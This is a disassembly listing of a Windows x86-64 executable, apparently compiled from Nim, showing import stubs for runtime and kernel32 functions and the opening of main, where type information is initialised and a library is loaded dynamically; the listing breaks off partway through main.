  408410:	ff 25 1e 00 04 00    	jmp    *0x4001e(%rip)        # 448434 <__imp_malloc>
  408416:	90                   	nop
  408417:	90                   	nop

0000000000408418 <getenv>:
  408418:	ff 25 06 00 04 00    	jmp    *0x40006(%rip)        # 448424 <__imp_getenv>
  40841e:	90                   	nop
  40841f:	90                   	nop

0000000000408420 <fwrite>:
  408420:	ff 25 f6 ff 03 00    	jmp    *0x3fff6(%rip)        # 44841c <__imp_fwrite>
  408426:	90                   	nop
  408427:	90                   	nop

0000000000408428 <free>:
  408428:	ff 25 e6 ff 03 00    	jmp    *0x3ffe6(%rip)        # 448414 <__imp_free>
  40842e:	90                   	nop
  40842f:	90                   	nop

0000000000408430 <fprintf>:
  408430:	ff 25 ce ff 03 00    	jmp    *0x3ffce(%rip)        # 448404 <__imp_fprintf>
  408436:	90                   	nop
  408437:	90                   	nop

0000000000408438 <fflush>:
  408438:	ff 25 be ff 03 00    	jmp    *0x3ffbe(%rip)        # 4483fc <__imp_fflush>
  40843e:	90                   	nop
  40843f:	90                   	nop

0000000000408440 <exit>:
  408440:	ff 25 ae ff 03 00    	jmp    *0x3ffae(%rip)        # 4483f4 <__imp_exit>
  408446:	90                   	nop
  408447:	90                   	nop

0000000000408448 <calloc>:
  408448:	ff 25 9e ff 03 00    	jmp    *0x3ff9e(%rip)        # 4483ec <__imp_calloc>
  40844e:	90                   	nop
  40844f:	90                   	nop

0000000000408450 <abort>:
  408450:	ff 25 8e ff 03 00    	jmp    *0x3ff8e(%rip)        # 4483e4 <__imp_abort>
  408456:	90                   	nop
  408457:	90                   	nop

0000000000408458 <_setmode>:
  408458:	ff 25 7e ff 03 00    	jmp    *0x3ff7e(%rip)        # 4483dc <__imp__setmode>
  40845e:	90                   	nop
  40845f:	90                   	nop

0000000000408460 <_setjmp>:
  408460:	ff 25 6e ff 03 00    	jmp    *0x3ff6e(%rip)        # 4483d4 <__imp__setjmp>
  408466:	90                   	nop
  408467:	90                   	nop

0000000000408468 <_onexit>:
  408468:	ff 25 5e ff 03 00    	jmp    *0x3ff5e(%rip)        # 4483cc <__imp__onexit>
  40846e:	90                   	nop
  40846f:	90                   	nop

0000000000408470 <_initterm>:
  408470:	ff 25 4e ff 03 00    	jmp    *0x3ff4e(%rip)        # 4483c4 <__imp__initterm>
  408476:	90                   	nop
  408477:	90                   	nop

0000000000408478 <_fileno>:
  408478:	ff 25 36 ff 03 00    	jmp    *0x3ff36(%rip)        # 4483b4 <__imp__fileno>
  40847e:	90                   	nop
  40847f:	90                   	nop

0000000000408480 <_cexit>:
  408480:	ff 25 26 ff 03 00    	jmp    *0x3ff26(%rip)        # 4483ac <__imp__cexit>
  408486:	90                   	nop
  408487:	90                   	nop

0000000000408488 <_amsg_exit>:
  408488:	ff 25 16 ff 03 00    	jmp    *0x3ff16(%rip)        # 4483a4 <__imp__amsg_exit>
  40848e:	90                   	nop
  40848f:	90                   	nop

0000000000408490 <__setusermatherr>:
  408490:	ff 25 fe fe 03 00    	jmp    *0x3fefe(%rip)        # 448394 <__imp___setusermatherr>
  408496:	90                   	nop
  408497:	90                   	nop

0000000000408498 <__set_app_type>:
  408498:	ff 25 ee fe 03 00    	jmp    *0x3feee(%rip)        # 44838c <__imp___set_app_type>
  40849e:	90                   	nop
  40849f:	90                   	nop

00000000004084a0 <__lconv_init>:
  4084a0:	ff 25 de fe 03 00    	jmp    *0x3fede(%rip)        # 448384 <__imp___lconv_init>
  4084a6:	90                   	nop
  4084a7:	90                   	nop

00000000004084a8 <__getmainargs>:
  4084a8:	ff 25 be fe 03 00    	jmp    *0x3febe(%rip)        # 44836c <__imp___getmainargs>
  4084ae:	90                   	nop
  4084af:	90                   	nop

00000000004084b0 <__C_specific_handler>:
  4084b0:	ff 25 ae fe 03 00    	jmp    *0x3feae(%rip)        # 448364 <__imp___C_specific_handler>
  4084b6:	90                   	nop
  4084b7:	90                   	nop
  4084b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4084bf:	00 

00000000004084c0 <__acrt_iob_func>:
  4084c0:	53                   	push   %rbx
  4084c1:	48 83 ec 20          	sub    $0x20,%rsp
  4084c5:	89 cb                	mov    %ecx,%ebx
  4084c7:	e8 54 00 00 00       	call   408520 <__iob_func>
  4084cc:	89 d9                	mov    %ebx,%ecx
  4084ce:	48 8d 14 49          	lea    (%rcx,%rcx,2),%rdx
  4084d2:	48 c1 e2 04          	shl    $0x4,%rdx
  4084d6:	48 01 d0             	add    %rdx,%rax
  4084d9:	48 83 c4 20          	add    $0x20,%rsp
  4084dd:	5b                   	pop    %rbx
  4084de:	c3                   	ret
  4084df:	90                   	nop

00000000004084e0 <_get_invalid_parameter_handler>:
  4084e0:	48 8b 05 69 66 02 00 	mov    0x26669(%rip),%rax        # 42eb50 <handler>
  4084e7:	c3                   	ret
  4084e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4084ef:	00 

00000000004084f0 <_set_invalid_parameter_handler>:
  4084f0:	48 89 c8             	mov    %rcx,%rax
  4084f3:	48 87 05 56 66 02 00 	xchg   %rax,0x26656(%rip)        # 42eb50 <handler>
  4084fa:	c3                   	ret
  4084fb:	90                   	nop
  4084fc:	90                   	nop
  4084fd:	90                   	nop
  4084fe:	90                   	nop
  4084ff:	90                   	nop

0000000000408500 <__p__acmdln>:
  408500:	48 8b 05 19 98 00 00 	mov    0x9819(%rip),%rax        # 411d20 <.refptr.__imp__acmdln>
  408507:	48 8b 00             	mov    (%rax),%rax
  40850a:	c3                   	ret
  40850b:	90                   	nop
  40850c:	90                   	nop
  40850d:	90                   	nop
  40850e:	90                   	nop
  40850f:	90                   	nop

0000000000408510 <__p__fmode>:
  408510:	48 8b 05 19 98 00 00 	mov    0x9819(%rip),%rax        # 411d30 <.refptr.__imp__fmode>
  408517:	48 8b 00             	mov    (%rax),%rax
  40851a:	c3                   	ret
  40851b:	90                   	nop
  40851c:	90                   	nop
  40851d:	90                   	nop
  40851e:	90                   	nop
  40851f:	90                   	nop

0000000000408520 <__iob_func>:
  408520:	ff 25 56 fe 03 00    	jmp    *0x3fe56(%rip)        # 44837c <__imp___iob_func>
  408526:	90                   	nop
  408527:	90                   	nop
  408528:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40852f:	00 

0000000000408530 <VirtualQuery>:
  408530:	ff 25 1e fe 03 00    	jmp    *0x3fe1e(%rip)        # 448354 <__imp_VirtualQuery>
  408536:	90                   	nop
  408537:	90                   	nop

0000000000408538 <VirtualProtect>:
  408538:	ff 25 0e fe 03 00    	jmp    *0x3fe0e(%rip)        # 44834c <__imp_VirtualProtect>
  40853e:	90                   	nop
  40853f:	90                   	nop

0000000000408540 <VirtualFree>:
  408540:	ff 25 fe fd 03 00    	jmp    *0x3fdfe(%rip)        # 448344 <__imp_VirtualFree>
  408546:	90                   	nop
  408547:	90                   	nop

0000000000408548 <VirtualAlloc>:
  408548:	ff 25 ee fd 03 00    	jmp    *0x3fdee(%rip)        # 44833c <__imp_VirtualAlloc>
  40854e:	90                   	nop
  40854f:	90                   	nop

0000000000408550 <UnhandledExceptionFilter>:
  408550:	ff 25 de fd 03 00    	jmp    *0x3fdde(%rip)        # 448334 <__imp_UnhandledExceptionFilter>
  408556:	90                   	nop
  408557:	90                   	nop

0000000000408558 <TryEnterCriticalSection>:
  408558:	ff 25 ce fd 03 00    	jmp    *0x3fdce(%rip)        # 44832c <__imp_TryEnterCriticalSection>
  40855e:	90                   	nop
  40855f:	90                   	nop

0000000000408560 <TlsSetValue>:
  408560:	ff 25 be fd 03 00    	jmp    *0x3fdbe(%rip)        # 448324 <__imp_TlsSetValue>
  408566:	90                   	nop
  408567:	90                   	nop

0000000000408568 <TlsGetValue>:
  408568:	ff 25 ae fd 03 00    	jmp    *0x3fdae(%rip)        # 44831c <__imp_TlsGetValue>
  40856e:	90                   	nop
  40856f:	90                   	nop

0000000000408570 <TlsAlloc>:
  408570:	ff 25 9e fd 03 00    	jmp    *0x3fd9e(%rip)        # 448314 <__imp_TlsAlloc>
  408576:	90                   	nop
  408577:	90                   	nop

0000000000408578 <TerminateProcess>:
  408578:	ff 25 8e fd 03 00    	jmp    *0x3fd8e(%rip)        # 44830c <__imp_TerminateProcess>
  40857e:	90                   	nop
  40857f:	90                   	nop

0000000000408580 <Sleep>:
  408580:	ff 25 7e fd 03 00    	jmp    *0x3fd7e(%rip)        # 448304 <__imp_Sleep>
  408586:	90                   	nop
  408587:	90                   	nop

0000000000408588 <SetUnhandledExceptionFilter>:
  408588:	ff 25 6e fd 03 00    	jmp    *0x3fd6e(%rip)        # 4482fc <__imp_SetUnhandledExceptionFilter>
  40858e:	90                   	nop
  40858f:	90                   	nop

0000000000408590 <SetLastError>:
  408590:	ff 25 5e fd 03 00    	jmp    *0x3fd5e(%rip)        # 4482f4 <__imp_SetLastError>
  408596:	90                   	nop
  408597:	90                   	nop

0000000000408598 <RtlVirtualUnwind>:
  408598:	ff 25 4e fd 03 00    	jmp    *0x3fd4e(%rip)        # 4482ec <__imp_RtlVirtualUnwind>
  40859e:	90                   	nop
  40859f:	90                   	nop

00000000004085a0 <RtlLookupFunctionEntry>:
  4085a0:	ff 25 3e fd 03 00    	jmp    *0x3fd3e(%rip)        # 4482e4 <__imp_RtlLookupFunctionEntry>
  4085a6:	90                   	nop
  4085a7:	90                   	nop

00000000004085a8 <RtlCaptureContext>:
  4085a8:	ff 25 2e fd 03 00    	jmp    *0x3fd2e(%rip)        # 4482dc <__imp_RtlCaptureContext>
  4085ae:	90                   	nop
  4085af:	90                   	nop

00000000004085b0 <RtlAddFunctionTable>:
  4085b0:	ff 25 1e fd 03 00    	jmp    *0x3fd1e(%rip)        # 4482d4 <__imp_RtlAddFunctionTable>
  4085b6:	90                   	nop
  4085b7:	90                   	nop

00000000004085b8 <QueryPerformanceCounter>:
  4085b8:	ff 25 0e fd 03 00    	jmp    *0x3fd0e(%rip)        # 4482cc <__imp_QueryPerformanceCounter>
  4085be:	90                   	nop
  4085bf:	90                   	nop

00000000004085c0 <LoadLibraryA>:
  4085c0:	ff 25 fe fc 03 00    	jmp    *0x3fcfe(%rip)        # 4482c4 <__imp_LoadLibraryA>
  4085c6:	90                   	nop
  4085c7:	90                   	nop

00000000004085c8 <LeaveCriticalSection>:
  4085c8:	ff 25 ee fc 03 00    	jmp    *0x3fcee(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  4085ce:	90                   	nop
  4085cf:	90                   	nop

00000000004085d0 <InitializeCriticalSection>:
  4085d0:	ff 25 de fc 03 00    	jmp    *0x3fcde(%rip)        # 4482b4 <__imp_InitializeCriticalSection>
  4085d6:	90                   	nop
  4085d7:	90                   	nop

00000000004085d8 <GetTickCount>:
  4085d8:	ff 25 ce fc 03 00    	jmp    *0x3fcce(%rip)        # 4482ac <__imp_GetTickCount>
  4085de:	90                   	nop
  4085df:	90                   	nop

00000000004085e0 <GetSystemTimeAsFileTime>:
  4085e0:	ff 25 be fc 03 00    	jmp    *0x3fcbe(%rip)        # 4482a4 <__imp_GetSystemTimeAsFileTime>
  4085e6:	90                   	nop
  4085e7:	90                   	nop

00000000004085e8 <GetStartupInfoA>:
  4085e8:	ff 25 ae fc 03 00    	jmp    *0x3fcae(%rip)        # 44829c <__imp_GetStartupInfoA>
  4085ee:	90                   	nop
  4085ef:	90                   	nop

00000000004085f0 <GetProcAddress>:
  4085f0:	ff 25 9e fc 03 00    	jmp    *0x3fc9e(%rip)        # 448294 <__imp_GetProcAddress>
  4085f6:	90                   	nop
  4085f7:	90                   	nop

00000000004085f8 <GetLastError>:
  4085f8:	ff 25 8e fc 03 00    	jmp    *0x3fc8e(%rip)        # 44828c <__imp_GetLastError>
  4085fe:	90                   	nop
  4085ff:	90                   	nop

0000000000408600 <GetCurrentThreadId>:
  408600:	ff 25 7e fc 03 00    	jmp    *0x3fc7e(%rip)        # 448284 <__imp_GetCurrentThreadId>
  408606:	90                   	nop
  408607:	90                   	nop

0000000000408608 <GetCurrentProcessId>:
  408608:	ff 25 6e fc 03 00    	jmp    *0x3fc6e(%rip)        # 44827c <__imp_GetCurrentProcessId>
  40860e:	90                   	nop
  40860f:	90                   	nop

0000000000408610 <GetCurrentProcess>:
  408610:	ff 25 5e fc 03 00    	jmp    *0x3fc5e(%rip)        # 448274 <__imp_GetCurrentProcess>
  408616:	90                   	nop
  408617:	90                   	nop

0000000000408618 <EnterCriticalSection>:
  408618:	ff 25 4e fc 03 00    	jmp    *0x3fc4e(%rip)        # 44826c <__imp_EnterCriticalSection>
  40861e:	90                   	nop
  40861f:	90                   	nop

0000000000408620 <DeleteCriticalSection>:
  408620:	ff 25 3e fc 03 00    	jmp    *0x3fc3e(%rip)        # 448264 <__IAT_start__>
  408626:	90                   	nop
  408627:	90                   	nop
  408628:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40862f:	00 

0000000000408630 <printf>:
  408630:	ff 25 1e fe 03 00    	jmp    *0x3fe1e(%rip)        # 448454 <__imp_printf>
  408636:	90                   	nop
  408637:	90                   	nop

0000000000408638 <memcmp>:
  408638:	ff 25 06 fe 03 00    	jmp    *0x3fe06(%rip)        # 448444 <__imp_memcmp>
  40863e:	90                   	nop
  40863f:	90                   	nop

0000000000408640 <memchr>:
  408640:	ff 25 f6 fd 03 00    	jmp    *0x3fdf6(%rip)        # 44843c <__imp_memchr>
  408646:	90                   	nop
  408647:	90                   	nop

0000000000408648 <fputc>:
  408648:	ff 25 be fd 03 00    	jmp    *0x3fdbe(%rip)        # 44840c <__imp_fputc>
  40864e:	90                   	nop
  40864f:	90                   	nop

0000000000408650 <main>:
  408650:	41 57                	push   %r15
  408652:	41 56                	push   %r14
  408654:	41 55                	push   %r13
  408656:	41 54                	push   %r12
  408658:	55                   	push   %rbp
  408659:	57                   	push   %rdi
  40865a:	56                   	push   %rsi
  40865b:	53                   	push   %rbx
  40865c:	48 83 ec 38          	sub    $0x38,%rsp
  408660:	e8 5b e9 ff ff       	call   406fc0 <__main>
  408665:	48 8d 05 99 cd ff ff 	lea    -0x3267(%rip),%rax        # 405405 <PreMainInner>
  40866c:	48 c7 05 29 ca 01 00 	movq   $0x2,0x1ca29(%rip)        # 4250a0 <NTI__Tyd4y3haUOOHTj71TPIRag_>
  408673:	02 00 00 00 
  408677:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  40867c:	48 8d 05 bd cc 01 00 	lea    0x1ccbd(%rip),%rax        # 425340 <NTI__kDPg4wXyR8DDyA0MeEjIsw_>
  408683:	48 89 05 26 ca 01 00 	mov    %rax,0x1ca26(%rip)        # 4250b0 <NTI__Tyd4y3haUOOHTj71TPIRag_+0x10>
  40868a:	48 8d 05 0f ca 01 00 	lea    0x1ca0f(%rip),%rax        # 4250a0 <NTI__Tyd4y3haUOOHTj71TPIRag_>
  408691:	48 89 05 d8 c9 01 00 	mov    %rax,0x1c9d8(%rip)        # 425070 <NTI__4HwedE75WPfqZSQ0Cq2OUg_+0x10>
  408698:	48 8d 0d 41 90 00 00 	lea    0x9041(%rip),%rcx        # 4116e0 <TM__MnCJ0VAmeZ9aTATUB39cx60Q_4>
  40869f:	66 c7 05 00 ca 01 00 	movw   $0x331,0x1ca00(%rip)        # 4250a8 <NTI__Tyd4y3haUOOHTj71TPIRag_+0x8>
  4086a6:	31 03 
  4086a8:	48 8d 05 a1 8e ff ff 	lea    -0x715f(%rip),%rax        # 401550 <Marker_tyRef__4HwedE75WPfqZSQ0Cq2OUg>
  4086af:	48 c7 05 a6 c9 01 00 	movq   $0x8,0x1c9a6(%rip)        # 425060 <NTI__4HwedE75WPfqZSQ0Cq2OUg_>
  4086b6:	08 00 00 00 
  4086ba:	66 c7 05 a5 c9 01 00 	movw   $0x216,0x1c9a5(%rip)        # 425068 <NTI__4HwedE75WPfqZSQ0Cq2OUg_+0x8>
  4086c1:	16 02 
  4086c3:	48 89 05 be c9 01 00 	mov    %rax,0x1c9be(%rip)        # 425088 <NTI__4HwedE75WPfqZSQ0Cq2OUg_+0x28>
  4086ca:	e8 dc 92 ff ff       	call   4019ab <nimLoadLibrary>
  4086cf:	48 8d 0d ea 8f 00 00 	lea    0x8fea(%rip),%rcx        # 4116c0 <TM__MnCJ0VAmeZ9aTATUB39cx60Q_5>
  4086d6:	48 85 c0             	test   %rax,%rax
  4086d9:	48 89 05 08 ca 01 00 	mov    %rax,0x1ca08(%rip)        # 4250e8 <TM__MnCJ0VAmeZ9aTATUB39cx60Q_2>
  4086e0:	0f 84 72 0a 00 00    	je     409158 <main+0xb08>
  4086e6:	48 8d 15 a3 3b 00 00 	lea    0x3ba3(%rip),%rdx        # 40c290 <.rdata+0x290>
  4086ed:	48 89 c1             	mov    %rax,%rcx
  4086f0:	e8 7a 97 ff ff       	call   401e6f <nimGetProcAddr>
  4086f5:	48 8b 0d ec c9 01 00 	mov    0x1c9ec(%rip),%rcx        # 4250e8 <TM__MnCJ0VAmeZ9aTATUB39cx60Q_2>
  4086fc:	48 8d 15 a0 3b 00 00 	lea    0x3ba0(%rip),%rdx        # 40c2a3 <.rdata+0x2a3>
  408703:	48 89 05 d6 c9 01 00 	mov    %rax,0x1c9d6(%rip)        # 4250e0 <Dl_4756003_>
  40870a:	48 8d 35 9f 3b 00 00 	lea    0x3b9f(%rip),%rsi        # 40c2b0 <.rdata+0x2b0>
  408711:	48 8d 2d 08 25 02 00 	lea    0x22508(%rip),%rbp        # 42ac20 <NTI__ytyiCJqK439aF9cIibuRVpAg_>
  408718:	48 8d 1d 98 3b 00 00 	lea    0x3b98(%rip),%rbx        # 40c2b7 <.rdata+0x2b7>
  40871f:	e8 4b 97 ff ff       	call   401e6f <nimGetProcAddr>
  408724:	4c 8d 35 f5 1b 02 00 	lea    0x21bf5(%rip),%r14        # 42a320 <NTI__vr5DoT1jILTGdRlYv1OYpw_>
  40872b:	48 c7 05 aa 1a 02 00 	movq   $0x10,0x21aaa(%rip)        # 42a1e0 <NTI__IIomJ6ptE6vfJ5zRbATgkQ_>
  408732:	10 00 00 00 
  408736:	48 89 05 9b c9 01 00 	mov    %rax,0x1c99b(%rip)        # 4250d8 <Dl_4756006_>
  40873d:	48 8d 05 8c d0 01 00 	lea    0x1d08c(%rip),%rax        # 4257d0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x30>
  408744:	48 89 05 c5 d5 01 00 	mov    %rax,0x1d5c5(%rip)        # 425d10 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_2_2.56585>
  40874b:	48 83 c0 30          	add    $0x30,%rax
  40874f:	48 89 05 c2 d5 01 00 	mov    %rax,0x1d5c2(%rip)        # 425d18 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_2_2.56585+0x8>
  408756:	48 83 c0 30          	add    $0x30,%rax
  40875a:	48 89 05 d7 24 02 00 	mov    %rax,0x224d7(%rip)        # 42ac38 <NTI__ytyiCJqK439aF9cIibuRVpAg_+0x18>
  408761:	48 83 c0 30          	add    $0x30,%rax
  408765:	48 89 05 0c d0 01 00 	mov    %rax,0x1d00c(%rip)        # 425778 <NTI__diB2NTuAIWY0FO9c5IUJRGg_+0x18>
  40876c:	48 8d 05 ed cf 01 00 	lea    0x1cfed(%rip),%rax        # 425760 <NTI__diB2NTuAIWY0FO9c5IUJRGg_>
  408773:	48 89 05 76 1b 02 00 	mov    %rax,0x21b76(%rip)        # 42a2f0 <NTI__HsJiUUcO9cHBdUCi0HwkSTA_+0x10>
  40877a:	48 8d 05 83 8f ff ff 	lea    -0x707d(%rip),%rax        # 401704 <Marker_tyRef__HsJiUUcO9cHBdUCi0HwkSTA>
  408781:	48 89 05 80 1b 02 00 	mov    %rax,0x21b80(%rip)        # 42a308 <NTI__HsJiUUcO9cHBdUCi0HwkSTA_+0x28>
  408788:	4c 8d 2d 51 1b 02 00 	lea    0x21b51(%rip),%r13        # 42a2e0 <NTI__HsJiUUcO9cHBdUCi0HwkSTA_>
  40878f:	48 8d 05 7a d5 01 00 	lea    0x1d57a(%rip),%rax        # 425d10 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_2_2.56585>
  408796:	c6 05 4b 1a 02 00 12 	movb   $0x12,0x21a4b(%rip)        # 42a1e8 <NTI__IIomJ6ptE6vfJ5zRbATgkQ_+0x8>
  40879d:	66 c7 05 82 1b 02 00 	movw   $0x31a,0x21b82(%rip)        # 42a328 <NTI__vr5DoT1jILTGdRlYv1OYpw_+0x8>
  4087a4:	1a 03 
  4087a6:	48 8d 3d 18 3b 00 00 	lea    0x3b18(%rip),%rdi        # 40c2c5 <.rdata+0x2c5>
  4087ad:	c6 05 1c d0 01 00 01 	movb   $0x1,0x1d01c(%rip)        # 4257d0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x30>
  4087b4:	48 8d 15 0f 3b 00 00 	lea    0x3b0f(%rip),%rdx        # 40c2ca <.rdata+0x2ca>
  4087bb:	48 c7 05 2a 1a 02 00 	movq   $0x0,0x21a2a(%rip)        # 42a1f0 <NTI__IIomJ6ptE6vfJ5zRbATgkQ_+0x10>
  4087c2:	00 00 00 00 
  4087c6:	4c 8d 25 53 19 02 00 	lea    0x21953(%rip),%r12        # 42a120 <NTI__vU9aO9cTqOMn6CBzhV8rX7Sw_>
  4087cd:	4c 89 35 0c d0 01 00 	mov    %r14,0x1d00c(%rip)        # 4257e0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x40>
  4087d4:	4c 8d 3d 85 20 02 00 	lea    0x22085(%rip),%r15        # 42a860 <NTI__rR5Bzr1D5krxoo1NcNyeMA_>
  4087db:	48 89 35 06 d0 01 00 	mov    %rsi,0x1d006(%rip)        # 4257e8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x48>
  4087e2:	48 8d 0d 37 cf 01 00 	lea    0x1cf37(%rip),%rcx        # 425720 <NTI__XEycrCsme5C8CVWAYEcdBQ_>
  4087e9:	48 c7 05 3c 1b 02 00 	movq   $0x0,0x21b3c(%rip)        # 42a330 <NTI__vr5DoT1jILTGdRlYv1OYpw_+0x10>
  4087f0:	00 00 00 00 
  4087f4:	4c 8d 05 c5 d3 01 00 	lea    0x1d3c5(%rip),%r8        # 425bc0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x420>
  4087fb:	48 c7 05 1a 1b 02 00 	movq   $0x8,0x21b1a(%rip)        # 42a320 <NTI__vr5DoT1jILTGdRlYv1OYpw_>
  408802:	08 00 00 00 
  408806:	4d 8d 48 30          	lea    0x30(%r8),%r9
  40880a:	66 c7 05 15 24 02 00 	movw   $0x111,0x22415(%rip)        # 42ac28 <NTI__ytyiCJqK439aF9cIibuRVpAg_+0x8>
  408811:	11 01 
  408813:	4c 8d 15 a6 c9 01 00 	lea    0x1c9a6(%rip),%r10        # 4251c0 <NTI__t7nhKLvXTQS9cS8ByJU9bIag_>
  40881a:	48 c7 05 b3 cf 01 00 	movq   $0x0,0x1cfb3(%rip)        # 4257d8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x38>
  408821:	00 00 00 00 
  408825:	4c 8d 1d 89 aa ff ff 	lea    -0x5577(%rip),%r11        # 4032b5 <Marker_tyRef__8SzoIAgLw9ci2v0yafHj9b6Q>
  40882c:	48 c7 05 f9 23 02 00 	movq   $0x0,0x223f9(%rip)        # 42ac30 <NTI__ytyiCJqK439aF9cIibuRVpAg_+0x10>
  408833:	00 00 00 00 
  408837:	48 c7 05 de 23 02 00 	movq   $0x8,0x223de(%rip)        # 42ac20 <NTI__ytyiCJqK439aF9cIibuRVpAg_>
  40883e:	08 00 00 00 
  408842:	48 c7 05 03 d0 01 00 	movq   $0x0,0x1d003(%rip)        # 425850 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0xb0>
  408849:	00 00 00 00 
  40884d:	c6 05 dc cf 01 00 02 	movb   $0x2,0x1cfdc(%rip)        # 425830 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x90>
  408854:	48 89 2d 15 cf 01 00 	mov    %rbp,0x1cf15(%rip)        # 425770 <NTI__diB2NTuAIWY0FO9c5IUJRGg_+0x10>
  40885b:	48 c7 05 fa ce 01 00 	movq   $0x8,0x1cefa(%rip)        # 425760 <NTI__diB2NTuAIWY0FO9c5IUJRGg_>
  408862:	08 00 00 00 
  408866:	66 c7 05 f9 ce 01 00 	movw   $0x111,0x1cef9(%rip)        # 425768 <NTI__diB2NTuAIWY0FO9c5IUJRGg_+0x8>
  40886d:	11 01 
  40886f:	48 c7 05 06 d0 01 00 	movq   $0x0,0x1d006(%rip)        # 425880 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0xe0>
  408876:	00 00 00 00 
  40887a:	c6 05 df cf 01 00 02 	movb   $0x2,0x1cfdf(%rip)        # 425860 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0xc0>
  408881:	48 c7 05 54 1a 02 00 	movq   $0x8,0x21a54(%rip)        # 42a2e0 <NTI__HsJiUUcO9cHBdUCi0HwkSTA_>
  408888:	08 00 00 00 
  40888c:	c6 05 55 1a 02 00 16 	movb   $0x16,0x21a55(%rip)        # 42a2e8 <NTI__HsJiUUcO9cHBdUCi0HwkSTA_+0x8>
  408893:	c6 05 66 cf 01 00 01 	movb   $0x1,0x1cf66(%rip)        # 425800 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x60>
  40889a:	48 c7 05 63 cf 01 00 	movq   $0x8,0x1cf63(%rip)        # 425808 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x68>
  4088a1:	08 00 00 00 
  4088a5:	4c 89 2d 64 cf 01 00 	mov    %r13,0x1cf64(%rip)        # 425810 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x70>
  4088ac:	48 89 1d 65 cf 01 00 	mov    %rbx,0x1cf65(%rip)        # 425818 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x78>
  4088b3:	48 89 05 0e cf 01 00 	mov    %rax,0x1cf0e(%rip)        # 4257c8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x28>
  4088ba:	48 8d 05 df ce 01 00 	lea    0x1cedf(%rip),%rax        # 4257a0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589>
  4088c1:	48 89 05 30 19 02 00 	mov    %rax,0x21930(%rip)        # 42a1f8 <NTI__IIomJ6ptE6vfJ5zRbATgkQ_+0x18>
  4088c8:	48 8d 05 11 19 02 00 	lea    0x21911(%rip),%rax        # 42a1e0 <NTI__IIomJ6ptE6vfJ5zRbATgkQ_>
  4088cf:	48 89 05 7a 16 02 00 	mov    %rax,0x2167a(%rip)        # 429f50 <NTI__WF89a8QyKeDCh4DYWTmSiBg_+0x10>
  4088d6:	48 8d 05 23 a9 ff ff 	lea    -0x56dd(%rip),%rax        # 403200 <Marker_tySequence__WF89a8QyKeDCh4DYWTmSiBg>
  4088dd:	48 89 05 84 16 02 00 	mov    %rax,0x21684(%rip)        # 429f68 <NTI__WF89a8QyKeDCh4DYWTmSiBg_+0x28>
  4088e4:	48 8d 05 d5 cf 01 00 	lea    0x1cfd5(%rip),%rax        # 4258c0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x120>
  4088eb:	48 89 05 ee cd 01 00 	mov    %rax,0x1cdee(%rip)        # 4256e0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_4_5.56586>
  4088f2:	48 8d 05 c5 39 00 00 	lea    0x39c5(%rip),%rax        # 40c2be <.rdata+0x2be>
  4088f9:	48 89 05 d8 cf 01 00 	mov    %rax,0x1cfd8(%rip)        # 4258d8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x138>
  408900:	48 8d 05 e9 cf 01 00 	lea    0x1cfe9(%rip),%rax        # 4258f0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x150>
  408907:	48 89 3d fa cf 01 00 	mov    %rdi,0x1cffa(%rip)        # 425908 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x168>
  40890e:	48 8d 3d 0b d0 01 00 	lea    0x1d00b(%rip),%rdi        # 425920 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x180>
  408915:	48 89 05 cc cd 01 00 	mov    %rax,0x1cdcc(%rip)        # 4256e8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_4_5.56586+0x8>
  40891c:	48 8d 05 7d cd 01 00 	lea    0x1cd7d(%rip),%rax        # 4256a0 <NTI__S9agCYBinaYZnGWcjTdxclg_>
  408923:	48 89 3d c6 cd 01 00 	mov    %rdi,0x1cdc6(%rip)        # 4256f0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_4_5.56586+0x10>
  40892a:	48 8d 3d cf 24 02 00 	lea    0x224cf(%rip),%rdi        # 42ae00 <NTI__77mFvmsOLKik79ci2hXkHEg_>
  408931:	48 89 15 00 d0 01 00 	mov    %rdx,0x1d000(%rip)        # 425938 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x198>
  408938:	48 8d 15 11 d0 01 00 	lea    0x1d011(%rip),%rdx        # 425950 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x1b0>
  40893f:	48 89 05 ba cf 01 00 	mov    %rax,0x1cfba(%rip)        # 425900 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x160>
  408946:	48 c7 05 6f ce 01 00 	movq   $0x2,0x1ce6f(%rip)        # 4257c0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x20>
  40894d:	02 00 00 00 
